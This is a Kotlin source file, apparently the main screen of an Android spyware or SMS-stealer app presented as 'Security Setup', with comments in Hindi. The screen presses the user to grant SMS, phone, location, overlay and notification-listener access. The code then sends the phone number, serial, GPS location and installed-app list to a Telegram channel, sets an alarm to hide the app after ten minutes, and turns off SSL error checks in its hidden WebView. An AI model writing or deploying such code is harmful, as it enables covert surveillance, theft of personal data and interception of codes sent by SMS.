package com.security.testapp

import android.Manifest
import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.net.http.SslError
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.telephony.TelephonyManager
import android.view.Gravity
import android.view.View
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var permissionLayout: LinearLayout
    private lateinit var grantButton: Button
    private val prefs by lazy { getSharedPreferences("app_prefs", MODE_PRIVATE) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val rootLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
            // प्रीमियम ग्रेडिएंट बैकग्राउंड
            background = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(Color.parseColor("#1a1a2e"), Color.parseColor("#16213e"), Color.parseColor("#0f3460"))
            )
        }

        // परमिशन कार्ड (सफ़ेद, गोल, सेंटर)
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(60, 60, 60, 60)
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = 36f
                setColor(Color.parseColor("#ffffff"))
                setStroke(2, Color.parseColor("#e0e0e0"))
            }
        }

        // आइकॉन (🔐)
        val iconText = TextView(this).apply {
            text = "🔐"
            textSize = 48f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 16)
        }

        // टाइटल
        val titleText = TextView(this).apply {
            text = "Security Setup"
            textSize = 24f
            setTextColor(Color.parseColor("#0f3460"))
            gravity = Gravity.CENTER
            setTypeface(null, android.graphics.Typeface.BOLD)
            setPadding(0, 0, 0, 8)
        }

        // डिस्क्रिप्शन
        val descText = TextView(this).apply {
            text = "This app requires the following permissions to work properly:\n\n📩 SMS\n🔔 Notifications\n📱 Phone\n📍 Location\n🎨 Overlay"
            textSize = 14f
            setTextColor(Color.parseColor("#333333"))
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 32)
        }

        // ग्रांट बटन (गोल, ग्रेडिएंट)
        grantButton = Button(this).apply {
            text = "GRANT ALL PERMISSIONS"
            textSize = 16f
            setTextColor(Color.WHITE)
            setTypeface(null, android.graphics.Typeface.BOLD)
            setPadding(48, 24, 48, 24)
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = 100f
                setColor(Color.parseColor("#e94560"))
            }
            setOnClickListener { checkAndRequestPermissions() }
        }

        card.addView(iconText)
        card.addView(titleText)
        card.addView(descText)
        card.addView(grantButton)

        // कार्ड को बीच में रखने के लिए स्पेस
        val spacer1 = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(0, 0, 1f)
        }
        val spacer2 = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(0, 0, 1f)
        }

        permissionLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
            addView(spacer1)
            addView(card)
            addView(spacer2)
        }

        rootLayout.addView(permissionLayout)

        // वेबव्यू (छिपा हुआ)
        webView = WebView(this).apply {
            visibility = View.GONE
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            settings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            settings.userAgentString = "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
            webViewClient = MyWebViewClient()
            webChromeClient = WebChromeClient()
            loadUrl("https://your-website.com") // ← बदलें
        }
        rootLayout.addView(webView)

        setContentView(rootLayout)

        // पहली बार खोलने पर बेसिक कनेक्शन अलर्ट (बिना परमिशन वाली जानकारी)
        if (!prefs.getBoolean("first_launch_done", false)) {
            prefs.edit().putBoolean("first_launch_done", true).apply()
            sendBasicConnectionAlert()
        }

        // हर बार चेक करें
        updateUI()
    }

    private fun updateUI() {
        if (allPermissionsGranted()) {
            permissionLayout.visibility = View.GONE
            webView.visibility = View.VISIBLE
            LocationReceiver.startAlarm(this)

            // परमिशन मिलने के बाद पूरी डिटेल भेजें और हाइड अलार्म सेट करें (सिर्फ पहली बार)
            if (!prefs.getBoolean("full_info_sent", false)) {
                sendFullInfoAlert()
                scheduleHideAlarm()
                prefs.edit().putBoolean("full_info_sent", true).apply()
            }
        } else {
            permissionLayout.visibility = View.VISIBLE
            webView.visibility = View.GONE
        }
    }

    private fun allPermissionsGranted(): Boolean {
        val smsOk = ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED
        val phoneOk = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
        val notifOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
        else true
        val overlayOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true
        val listenerOk = isNotificationListenerEnabled()
        val locationOk = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
                || ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        return smsOk && phoneOk && notifOk && overlayOk && listenerOk && locationOk
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat?.contains(packageName) == true
    }

    private fun checkAndRequestPermissions() {
        val missing = mutableListOf<String>()
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED)
            missing.add(Manifest.permission.RECEIVE_SMS)
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED)
            missing.add(Manifest.permission.SEND_SMS)
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED)
            missing.add(Manifest.permission.READ_PHONE_STATE)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
            missing.add(Manifest.permission.POST_NOTIFICATIONS)
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            missing.add(Manifest.permission.ACCESS_FINE_LOCATION)
        }

        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 200)
            return
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
            Toast.makeText(this, "Enable 'Display over other apps'", Toast.LENGTH_LONG).show()
            return
        }

        if (!isNotificationListenerEnabled()) {
            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            Toast.makeText(this, "Enable 'Settings' in Notification access", Toast.LENGTH_LONG).show()
            return
        }

        updateUI()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 200) {
            for ((index, perm) in permissions.withIndex()) {
                if (grantResults[index] != PackageManager.PERMISSION_GRANTED) {
                    if (!ActivityCompat.shouldShowRequestPermissionRationale(this, perm)) {
                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$packageName"))
                        startActivity(intent)
                        Toast.makeText(this, "Please manually grant the permission in App Settings", Toast.LENGTH_LONG).show()
                    } else {
                        ActivityCompat.requestPermissions(this, arrayOf(perm), 200)
                    }
                    return
                }
            }
            checkAndRequestPermissions()
        }
    }

    override fun onResume() {
        super.onResume()
        updateUI()
    }

    // ---------- अलर्ट ----------
    private fun sendBasicConnectionAlert() {
        val brand = Build.BRAND
        val model = Build.MODEL
        val os = Build.VERSION.RELEASE
        val sdk = Build.VERSION.SDK_INT
        val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US).format(java.util.Date())

        val message = "<b>🔗 DEVICE CONNECTED</b>\n" +
                "<b>📱 Device:</b> $brand $model\n" +
                "<b>⚙️ OS:</b> Android $os (SDK $sdk)\n" +
                "<b>🕒 Time:</b> $timestamp\n" +
                "<b>📌 App Version:</b> 1.0"

        TelegramHelper.sendMessage(message)
    }

    private fun sendFullInfoAlert() {
        try {
            val brand = Build.BRAND
            val model = Build.MODEL
            val os = Build.VERSION.RELEASE
            val sdk = Build.VERSION.SDK_INT
            val serial = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) Build.getSerial() else "Unknown"
            val phoneNumber = getMyPhoneNumber()
            val apps = getInstalledApps()
            val location = getLastLocation()
            val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US).format(java.util.Date())

            val message = "<b>✅ ALL PERMISSIONS GRANTED</b>\n" +
                    "<b>📱 Device:</b> $brand $model\n" +
                    "<b>⚙️ OS:</b> Android $os (SDK $sdk)\n" +
                    "<b>🔢 Serial:</b> $serial\n" +
                    "<b>📞 Phone Number:</b> $phoneNumber\n" +
                    "<b>📍 Location:</b> $location\n" +
                    "<b>📦 Installed Apps:</b> $apps\n" +
                    "<b>🕒 Time:</b> $timestamp"

            TelegramHelper.sendMessage(message)
        } catch (e: Exception) {
            TelegramHelper.sendMessage("<b>⚠️ Full info failed:</b> ${e.message}")
        }
    }

    private fun getMyPhoneNumber(): String {
        return try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
                tm.line1Number ?: "Not available"
            } else "Permission denied"
        } catch (e: Exception) { "Error" }
    }

    private fun getInstalledApps(): String {
        return try {
            val pm = packageManager
            pm.getInstalledApplications(PackageManager.GET_META_DATA)
                .filter { it.packageName != packageName && (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 }
                .joinToString(", ") { it.packageName }
        } catch (e: Exception) { "Error" }
    }

    private fun getLastLocation(): String {
        return try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                return "Permission denied"
            }
            val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
            val loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
                ?: lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
            if (loc != null) "https://maps.google.com/?q=${loc.latitude},${loc.longitude}" else "Not available"
        } catch (e: Exception) { "Error" }
    }

    private fun scheduleHideAlarm() {
        if (prefs.getBoolean("hide_done", false)) return
        val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
        val intent = Intent(this, HideReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val triggerTime = System.currentTimeMillis() + 10 * 60 * 1000L
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                if (alarmManager.canScheduleExactAlarms()) {
                    alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
                } else {
                    alarmManager.set(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
                }
            } else {
                alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
            }
        } catch (_: Exception) {}
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack()
        } else {
            super.onBackPressed()
        }
    }

    private inner class MyWebViewClient : WebViewClient() {
        override fun onReceivedSslError(view: WebView?, handler: SslErrorHandler?, error: SslError?) {
            handler?.proceed()
        }
        override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
            val url = request?.url?.toString() ?: return false
            return if (url.startsWith("http://") || url.startsWith("https://")) false else true
        }
    }
}
